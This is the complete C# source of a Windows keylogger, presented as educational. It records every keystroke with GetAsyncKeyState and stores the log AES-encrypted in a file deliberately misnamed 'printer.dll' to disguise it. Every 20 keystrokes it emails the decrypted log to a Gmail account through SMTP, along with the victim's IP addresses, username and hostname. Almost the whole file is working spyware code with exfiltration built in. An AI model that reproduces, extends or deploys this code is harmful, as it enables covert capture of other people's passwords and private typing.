// Author : Maximilien Schmitt-Laurin

// IMPORTANT NOTICE : This source code is meant for educational purposes only and should
//                    not be used for malicious activity.

//                    This keylogger can only run on Windows 10 machines. In order
//                    to read the captured keystrokes, you will need to provide
//                    the credentials of a Gmail account on line 43 and 44. The
//                    email address of your Gmail account has to end with @gmail.com.
//                    It is also important to know that this program will create a
//                    file named printer.dll in your Documents folder (File Explorer)
//                    during its execution.


// Description :      The way this keylogger works is pretty simple. First, it captures
//                    every keystroke typed by the user on the keyboard. Then, every
//                    20 characters typed, it encrypts the keystrokes data with AES
//                    encryption before storing the cipher text in a file named
//                    'printer.dll'. The encrypted data and the 'printer.dll' file name
//                    are means to hide the intent behind this particular file. Once
//                    the cipher text is stored in 'printer.dll', the program then reads
//                    inside the file and decrypts the cipher text. It is only when the
//                    keystrokes data is decrypted that the program sends it to your
//                    gmail account.




using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace EncryptedKeylogger
{
    class Program
    {
        // ********************************** PROVIDE YOUR GMAIL ACCOUNT CREDENTIALS HERE ************************************

        const string EMAIL_ADDRESS = "something@gmail.com"; // <----- WRITE YOUR GMAIL ADDRESS HERE
        const string EMAIL_PASSWORD = "YourPassword123";    // <----- WRITE YOUR GMAIL PASSWORD HERE

        // *******************************************************************************************************************



        // This DLL is necessary in order to use GetAsyncKeyState(Int32 i).

        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;

        static byte[] AES_KEY;
        static byte[] AES_IV;

        static void Main(string[] args)
        {
            String folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            string filepath = (folderPath + @"\printer.dll");

            // String to hold all of the keystrokes
            string keystrokes_data = "";

            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath)) { }
            }


            // Create an AesManaged object that will be needed for our AES encryption
            // and decryption.

            AesManaged aes = new AesManaged();

            AES_KEY = aes.Key;
            AES_IV = aes.IV;

            // Capture keystrokes and display them to the console

            while (true)
            {
                // Pause and let other programs get a chance to run.

                Thread.Sleep(5);

                // Used to delimit the range of decimal values corresponding to
                // the keyboard keys in the ASCII table.

                const int MIN_ASCII_DEC_VALUE = 32;
                const int MAX_ASCII_DEC_VALUE = 127;

                // Check all keys for their state.

                for (int i = MIN_ASCII_DEC_VALUE; i < MAX_ASCII_DEC_VALUE; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    bool isKeyPressed = keyState == 32769;


                    if (isKeyPressed)
                    {
                        char key = (char) i;

                        // Print to the console

                        Console.Write(key + ", ");

                        keystrokes_data += key;

                        numberOfKeystrokes++;

                        // Send email message every 20 characters typed.

                        if (numberOfKeystrokes % 20 == 0)
                        {

                            // Encrypt the keystrokes data with AES.

                            byte[] encrypted = Encrypt(keystrokes_data, AES_KEY, AES_IV);

                            // Store the cipher text into a file.

                            using (StreamWriter sw = File.CreateText(filepath))
                            {
                                sw.Write(Convert.ToBase64String(encrypted));
                            }

                            // Send email.

                            SendNewMessage();
                        }
                    }
                }
            }
        }

        // Periodically send the decrypted file data to an external email address.

        static void SendNewMessage()
        {
            String folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderPath + @"\printer.dll";

            // Retrieve the cipher text in the file.

            byte[] encrypted = Convert.FromBase64String(File.ReadAllText(filePath));

            // Decrypt the cipher text into readable text.

            String logContents = Decrypt(encrypted, AES_KEY, AES_IV);

            // Create an email message.

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            string emailBody = "";


            // This will tell us the computer name on the network.

            var host = Dns.GetHostEntry(Dns.GetHostName());

            // The computer may have more than one IP address.

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address + "\n";
            }

            emailBody += "User: " + Environment.UserName + "\n";
            emailBody += "Host: " + Dns.GetHostName() + "\n";
            emailBody += "Time: " + now.ToString() + "\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress(EMAIL_ADDRESS);
            mailMessage.To.Add(EMAIL_ADDRESS);
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(EMAIL_ADDRESS, EMAIL_PASSWORD);
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }


        // Encrypt plain text with AES encryption.

        static byte[] Encrypt(string plainText, byte[] Key, byte[] IV)
        {
            byte[] encrypted;


            // Create a new AesManaged.

            using (AesManaged aes = new AesManaged())
            {

                // Create encryptor.

                ICryptoTransform encryptor = aes.CreateEncryptor(Key, IV);


                // Create MemoryStream.

                using (MemoryStream ms = new MemoryStream())
                {
                    // Create crypto stream using the CryptoStream class. This class is the key to encryption    
                    // and encrypts and decrypts data from any given stream. In this case, we will pass a memory stream    
                    // to encrypt.

                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        // Create StreamWriter and write data to a stream.

                        using (StreamWriter sw = new StreamWriter(cs))
                            sw.Write(plainText);

                        encrypted = ms.ToArray();
                    }
                }
            }

            // Return encrypted data.

            return encrypted;
        }


        // Decrypt cipher text with AES decryption.

        static string Decrypt(byte[] cipherText, byte[] Key, byte[] IV)
        {
            string plaintext = null;


            // Create AesManaged.

            using (AesManaged aes = new AesManaged())
            {

                // Create a decryptor.

                ICryptoTransform decryptor = aes.CreateDecryptor(Key, IV);


                // Create the streams used for decryption.

                using (MemoryStream ms = new MemoryStream(cipherText))
                {
                    // Create crypto stream.

                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        // Read crypto stream.

                        using (StreamReader reader = new StreamReader(cs))
                            plaintext = reader.ReadToEnd();
                    }
                }
            }

            return plaintext;
        }
    }
}